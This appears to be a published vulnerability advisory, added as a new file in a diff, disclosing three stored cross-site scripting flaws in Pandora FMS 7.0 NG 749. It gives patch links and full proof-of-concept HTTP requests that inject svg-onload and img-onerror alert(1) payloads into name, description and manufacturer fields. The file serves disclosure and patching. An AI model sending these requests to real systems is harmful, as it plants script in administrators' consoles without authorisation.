@@ -1,0 +1,110 @@
+# Exploit Title: Pandora FMS 7.0 NG 749 - Multiple Persistent Cross-Site Scripting Vulnerabilities
+# Date: 11-14-2020
+# Exploit Author: Matthew Aberegg
+# Vendor Homepage: https://pandorafms.com/
+# Software Link: https://pandorafms.com/community/get-started/
+# Version: Pandora FMS 7.0 NG 749
+# Tested on: Ubuntu 18.04
+
+
+# Vulnerability Details
+# Description : A persistent cross-site scripting vulnerability exists in the "Edit OS" functionality of Pandora FMS.
+# Vulnerable Parameters : name, description
+# Patch Link : https://github.com/pandorafms/pandorafms/commit/58f521e8b570802fa33c75f99586e5b01b06731b
+
+
+#POC
+
+POST /pandora_console/index.php?sec=gsetup&sec2=godmode/setup/os&tab=builder HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 132
+Origin: http://TARGET
+Connection: close
+Referer: http://TARGET/pandora_console/index.php?sec=gsetup&sec2=godmode/setup/os&tab=builder
+Cookie: PHPSESSID=i5uv0ugb4bdu9avagk38vcdok3
+Upgrade-Insecure-Requests: 1
+
+name=%3Csvg%2Fonload%3Dalert%281%29%3E&description=%3Csvg%2Fonload%3Dalert%281%29%3E&icon=0&id_os=0&action=save&update_button=Create
+
+
+############################################################################################################
+
+# Vulnerability Details
+# Description : A persistent cross-site scripting vulnerability exists in the "Private Enterprise Numbers" functionality of Pandora FMS.
+# Vulnerable Parameters : manufacturer, description
+# Patch Link : https://github.com/pandorafms/pandorafms/commit/b9b94e1382f6e340fd9f3136972cca4373f00eb0
+
+
+#POC
+
+POST /pandora_console/ajax.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------195778570630678476283866516641
+Content-Length: 846
+Origin: http://TARGET
+Connection: close
+Referer: http://TARGET/pandora_console/index.php?sec=templates&sec2=godmode/modules/private_enterprise_numbers
+Cookie: PHPSESSID=i5uv0ugb4bdu9avagk38vcdok3
+
+-----------------------------195778570630678476283866516641
+Content-Disposition: form-data; name="is_new"
+
+1
+-----------------------------195778570630678476283866516641
+Content-Disposition: form-data; name="page"
+
+godmode/modules/private_enterprise_numbers
+-----------------------------195778570630678476283866516641
+Content-Disposition: form-data; name="method"
+
+add
+-----------------------------195778570630678476283866516641
+Content-Disposition: form-data; name="pen"
+
+123
+-----------------------------195778570630678476283866516641
+Content-Disposition: form-data; name="manufacturer"
+
+<img src=a onerror=alert(1)>
+-----------------------------195778570630678476283866516641
+Content-Disposition: form-data; name="description"
+
+<img src=a onerror=alert(1)>
+-----------------------------195778570630678476283866516641--
+
+
+############################################################################################################
+
+# Vulnerability Details
+# Description : A persistent cross-site scripting vulnerability exists in the "Module Template Management" functionality of Pandora FMS.
+# Vulnerable Parameters : name, description
+# Patch Link : https://github.com/pandorafms/pandorafms/commit/e833c318a5a91d6d709a5b266c1245261b4c0e70
+
+
+# POC
+
+POST /pandora_console/index.php?sec=gmodules&sec2=godmode/modules/manage_module_templates HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 316
+Origin: http://TARGET
+Connection: close
+Referer: http://TARGET/pandora_console/index.php?sec=gmodules&sec2=godmode/modules/manage_module_templates
+Cookie: PHPSESSID=i5uv0ugb4bdu9avagk38vcdok3
+Upgrade-Insecure-Requests: 1
+
+id_np=0&valid-pen=1%2C2%2C4%2C9%2C11%2C63%2C111%2C116%2C123%2C171%2C173%2C188%2C207%2C674%2C2021%2C2636%2C3375%2C3861%2C6486%2C6574%2C8072%2C10002%2C12356%2C13062%2C14988%2C19464%2C41112%2C52627%2C53526%2C&name=%3Csvg%2Fonload%3Dalert%281%29%3E&description=%3Csvg%2Fonload%3Dalert%281%29%3E&pen=&action_button=Create
